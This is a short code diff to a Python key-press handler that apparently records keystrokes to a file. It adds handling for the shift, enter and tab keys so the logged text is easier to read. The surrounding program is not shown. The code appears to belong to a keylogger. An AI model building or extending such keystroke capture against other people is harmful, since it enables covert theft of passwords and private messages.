@@ -14,6 +14,12 @@ def press(key):
         sys.exit()
     elif key == 'Key.backspace':
         key = "<-del-"
+    elif key == 'Key.shift' or key == 'Key.shift_r':
+        key = 'SHIFT+'
+    elif key == 'Key.enter':
+        key = '\n'
+    elif key == 'Key.tab':
+        key = '\t'
 
     f.write(key.replace("'", ""))
 
